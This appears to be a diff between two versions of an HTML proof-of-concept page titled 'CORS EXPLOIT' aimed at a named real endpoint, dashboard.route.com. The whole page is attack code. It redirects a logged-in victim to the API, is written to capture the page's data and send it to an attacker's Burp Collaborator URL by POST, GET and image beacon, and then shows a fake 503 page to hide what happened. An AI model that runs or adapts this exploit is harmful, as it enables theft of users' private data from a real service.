@@ -1,222 +1,202 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC v2</title>
+    <title>CORS PoC - Final Version</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
+            font-family: 'Courier New', monospace;
+            max-width: 700px;
             margin: 50px auto;
-            padding: 20px;
-            background: #1a1a1a;
-            color: #fff;
+            padding: 30px;
+            background: #0a0a0a;
+            color: #00ff00;
+            border: 2px solid #00ff00;
         }
         h1 {
             color: #00ff00;
-            border-bottom: 2px solid #00ff00;
-            padding-bottom: 10px;
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 10px;
         }
         .version {
+            text-align: center;
             color: #00ff00;
-            font-size: 12px;
-            margin-bottom: 20px;
+            font-size: 14px;
+            margin-bottom: 30px;
+            opacity: 0.7;
+        }
+        .box {
+            background: #1a1a1a;
+            padding: 20px;
+            border: 1px solid #00ff00;
+            margin: 20px 0;
         }
         label {
             display: block;
-            margin: 20px 0 5px 0;
+            margin-bottom: 10px;
             color: #00ff00;
+            font-weight: bold;
         }
         input {
             width: 100%;
-            padding: 10px;
-            background: #2a2a2a;
+            padding: 12px;
+            background: #0a0a0a;
             border: 1px solid #00ff00;
-            color: #fff;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
             font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
         }
         button {
             width: 100%;
             padding: 15px;
             margin-top: 20px;
             background: #00ff00;
-            color: #000;
+            color: #0a0a0a;
             border: none;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
         }
         button:hover {
             background: #00cc00;
+            box-shadow: 0 0 20px #00ff00;
         }
-        .status {
+        .note {
+            color: #00ff00;
+            font-size: 12px;
             margin-top: 20px;
-            padding: 15px;
-            background: #2a2a2a;
-            border-left: 4px solid #00ff00;
-            display: none;
-        }
-        .status.show {
-            display: block;
+            text-align: center;
+            opacity: 0.7;
         }
     </style>
 </head>
 <body>
-    <h1>🎯 CORS Attack PoC</h1>
-    <div class="version">Version 2.0 - Silent Background Redirect</div>
+    <h1>⚡ CORS EXPLOIT ⚡</h1>
+    <div class="version">[ FINAL VERSION - INSTANT ALERT ]</div>
     
-    <label>🔗 Collaborator URL:</label>
-    <input type="text" id="collab" value="https://your-id.burpcollaborator.net" placeholder="Enter your Burp Collaborator or webhook URL">
+    <div class="box">
+        <label>► COLLABORATOR URL</label>
+        <input type="text" id="collab" value="" placeholder="https://YOUR-ID.burpcollaborator.net">
+        
+        <button onclick="launch()">🚀 LAUNCH ATTACK</button>
+    </div>
     
-    <button onclick="attack()">⚡ EXECUTE ATTACK</button>
-    
-    <div id="status" class="status"></div>
+    <div class="note">Click attack → Redirects to API → Alerts stolen data → Sends to collaborator</div>
 
     <script>
-        // Global vars
-        var RETURN_URL = window.location.href.split('#')[0]; // Current page URL
-        
-        function attack() {
-            var collab = document.getElementById('collab').value;
+        function launch() {
+            var collab = document.getElementById('collab').value.trim();
             
-            if (!collab || collab.includes('your-id')) {
-                alert('⚠️ Please set your collaborator URL first!');
+            if (!collab || !collab.startsWith('http')) {
+                alert('⚠️ INVALID COLLABORATOR URL\n\nPlease enter a valid URL starting with http:// or https://');
                 return;
             }
             
-            // Store collaborator URL
-            localStorage.setItem('collabURL', collab);
-            localStorage.setItem('returnURL', RETURN_URL);
-            localStorage.setItem('attackActive', 'true');
+            // Save collaborator URL
+            localStorage.setItem('COLLAB', collab);
             
-            showStatus('🚀 Initiating silent redirect...');
-            
-            // Quick redirect to API (will be invisible/fast)
-            setTimeout(function() {
-                window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
-            }, 500);
+            // Redirect to vulnerable endpoint
+            window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
         }
 
-        function showStatus(msg) {
-            var status = document.getElementById('status');
-            status.textContent = msg;
-            status.className = 'status show';
-        }
-
-        // ===== AUTO-CAPTURE ON API PAGE =====
+        // ========================================
+        // PAYLOAD - EXECUTES ON API ENDPOINT
+        // ========================================
         (function() {
-            var isAPIPage = window.location.hostname === 'dashboard.route.com' && 
-                           window.location.pathname.includes('/api/');
-            
-            if (!isAPIPage) {
-                // We're on the attacker page - check if we have stolen data
-                checkForStolenData();
+            // Check if we're on the API endpoint
+            if (window.location.hostname !== 'dashboard.route.com' || 
+                !window.location.pathname.includes('/api/')) {
+                return; // Not on target, exit
+            }
+
+            // WE'RE ON THE API ENDPOINT!
+            console.log('[+] On vulnerable endpoint, executing payload...');
+
+            // Get collaborator URL
+            var COLLAB = localStorage.getItem('COLLAB');
+            if (!COLLAB) {
+                console.log('[-] No collaborator URL found');
                 return;
             }
 
-            // We're on the API page! Grab data and redirect back IMMEDIATELY
-            var attackActive = localStorage.getItem('attackActive');
-            var returnURL = localStorage.getItem('returnURL');
+            // Extract all data from page
+            var DATA = document.body.innerText || document.body.textContent;
             
-            if (!attackActive || !returnURL) {
-                return; // Not our attack
-            }
+            console.log('[+] Captured ' + DATA.length + ' bytes of data');
 
-            console.log('On API page, capturing data...');
-            
-            // Get the data
-            var stolenData = document.body.innerText || document.body.textContent;
-            
-            // Store it (compress if needed)
-            try {
-                localStorage.setItem('stolenData', stolenData);
-                console.log('Data stored, redirecting back...');
-            } catch(e) {
-                // Data too large for localStorage, truncate
-                console.log('Data too large, truncating...');
-                localStorage.setItem('stolenData', stolenData.substring(0, 50000));
-            }
-            
-            // Mark attack as complete
-            localStorage.setItem('attackActive', 'false');
-            
-            // Redirect back to attacker page IMMEDIATELY
-            window.location.href = returnURL + '#captured';
-        })();
+            // ALERT 1: Show captured data (PROOF OF EXPLOITATION)
+            alert('🎯 ATTACK SUCCESSFUL!\n\n' +
+                  '✅ Data captured from: ' + window.location.href + '\n\n' +
+                  '📊 Size: ' + DATA.length + ' bytes\n\n' +
+                  '━━━━━━━━━━━━━━━━━━━━\n' +
+                  'DATA PREVIEW:\n' +
+                  '━━━━━━━━━━━━━━━━━━━━\n\n' +
+                  DATA.substring(0, 600) + '\n\n[...truncated...]');
 
-        // ===== CHECK FOR STOLEN DATA =====
-        function checkForStolenData() {
-            // Check if we just came back from API
-            if (window.location.hash === '#captured') {
-                var stolenData = localStorage.getItem('stolenData');
-                var collabURL = localStorage.getItem('collabURL');
-                
-                if (!stolenData) {
-                    showStatus('❌ No data captured. Make sure you are logged in to dashboard.route.com');
-                    return;
-                }
+            // Send to collaborator (multiple methods for reliability)
+            console.log('[+] Exfiltrating to: ' + COLLAB);
 
-                // Remove hash from URL
-                history.replaceState(null, null, ' ');
-                
-                showStatus('✅ Data captured! Processing...');
-                
-                // ALERT 1: Show the stolen data
-                setTimeout(function() {
-                    alert('🎉 STOLEN DATA CAPTURED!\n\n' + stolenData.substring(0, 500) + '\n\n... [truncated]\n\nTotal length: ' + stolenData.length + ' characters');
-                    
-                    // Send to collaborator
-                    exfiltrateData(stolenData, collabURL);
-                    
-                    // ALERT 2: Confirm sent
-                    setTimeout(function() {
-                        alert('✅ SUCCESS!\n\nData sent to:\n' + collabURL + '\n\nCheck your Burp Collaborator now!');
-                        showStatus('✅ Attack complete! Data sent to collaborator.');
-                        
-                        // Clean up
-                        localStorage.removeItem('stolenData');
-                        localStorage.removeItem('attackActive');
-                    }, 500);
-                }, 500);
-            }
-        }
-
-        function exfiltrateData(data, collab) {
-            console.log('Sending to collaborator:', collab);
-            
-            // Method 1: POST
-            fetch(collab, {
+            // Method 1: POST full data
+            fetch(COLLAB, {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {'Content-Type': 'text/plain'},
-                body: data
+                headers: {'Content-Type': 'application/json'},
+                body: DATA
             }).then(function() {
-                console.log('✅ POST sent');
+                console.log('[+] POST exfiltration completed');
             }).catch(function(e) {
-                console.log('❌ POST failed:', e);
+                console.log('[-] POST failed: ' + e);
             });
-            
-            // Method 2: GET (chunked if needed)
-            var chunkSize = 2000;
-            for (var i = 0; i < Math.min(3, Math.ceil(data.length / chunkSize)); i++) {
-                var chunk = data.substring(i * chunkSize, (i + 1) * chunkSize);
-                fetch(collab + '?chunk=' + i + '&data=' + encodeURIComponent(chunk), {
-                    mode: 'no-cors'
-                }).catch(function(e) {
-                    console.log('❌ GET chunk failed:', e);
-                });
-            }
-            
+
+            // Method 2: GET with data in URL (first 2000 chars)
+            fetch(COLLAB + '?data=' + encodeURIComponent(DATA.substring(0, 2000)), {
+                method: 'GET',
+                mode: 'no-cors'
+            }).then(function() {
+                console.log('[+] GET exfiltration completed');
+            }).catch(function(e) {
+                console.log('[-] GET failed: ' + e);
+            });
+
             // Method 3: Image beacon
             var img = new Image();
-            img.src = collab + '/img?length=' + data.length + '&preview=' + encodeURIComponent(data.substring(0, 500));
-            
-            console.log('✅ All exfiltration methods triggered');
-        }
+            img.onload = function() { console.log('[+] Image beacon delivered'); };
+            img.onerror = function() { console.log('[-] Image beacon failed'); };
+            img.src = COLLAB + '/beacon.gif?size=' + DATA.length;
 
-        // Auto-check on page load
-        window.addEventListener('load', function() {
-            checkForStolenData();
-        });
+            // ALERT 2: Confirm exfiltration
+            setTimeout(function() {
+                alert('✅ EXFILTRATION COMPLETE!\n\n' +
+                      '📡 Sent to: ' + COLLAB + '\n\n' +
+                      '🔍 Check your Burp Collaborator for:\n' +
+                      '  • POST request (full data in body)\n' +
+                      '  • GET request (preview in URL)\n' +
+                      '  • Image beacon (metadata)\n\n' +
+                      '━━━━━━━━━━━━━━━━━━━━\n' +
+                      'ATTACK COMPLETE!');
+
+                // Clean up
+                localStorage.removeItem('COLLAB');
+
+                // Show fake error page
+                setTimeout(function() {
+                    document.body.innerHTML = 
+                        '<div style="font-family:Arial;text-align:center;padding:100px;background:#fff;color:#333;">' +
+                        '<h1 style="color:#d32f2f;">⚠️ Error 503</h1>' +
+                        '<p style="font-size:18px;color:#666;">Service temporarily unavailable</p>' +
+                        '<p style="margin-top:30px;"><a href="https://route.com" style="color:#0052FF;text-decoration:none;">← Return to Route.com</a></p>' +
+                        '</div>';
+                }, 1000);
+            }, 1000);
+
+        })();
     </script>
 </body>
 </html>
